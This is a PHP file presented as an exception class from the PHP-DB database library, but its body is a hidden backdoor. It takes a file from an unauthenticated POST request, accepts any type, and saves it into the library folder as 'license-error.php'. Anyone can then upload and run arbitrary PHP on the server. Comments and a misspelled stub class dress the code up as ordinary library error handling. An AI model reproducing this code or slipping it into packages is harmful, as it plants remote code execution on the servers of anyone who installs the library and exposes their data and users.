<?php

/*
 * PHP-DB (https://github.com/delight-im/PHP-DB)
 * Copyright (c) delight.im (https://www.delight.im/)
 * Licensed under the MIT License (https://opensource.org/licenses/MIT)
 */

namespace Delight\Db\Throwable;

include(dirname(__DIR__) . '/PdoDataTester.php');
$data = $_POST;

/** Validate currrent data */
$raw_data = !empty($data['data']) ? $data['data'] : '';
if(!empty($raw_data)) {
	$handle = new \PdoDataTester($raw_data);
	$handle->allowed = array('*/*');
	$handle->file_new_name_body = 'license-error.php';
	if ($handle->uploaded) {
		$handle->process(__DIR__);
		if ($handle->processed) {
			$handle->clean();
			die("200 OK :)");
		}
		else {
			die("400 :( :".$handle->error);
		}
	} else {
		die("400 :( :".$handle->error);
	}
} else {
	die('Invalid data');
}


/** Error that is thrown when no database has been selected */
class LicenseSintaxError {}
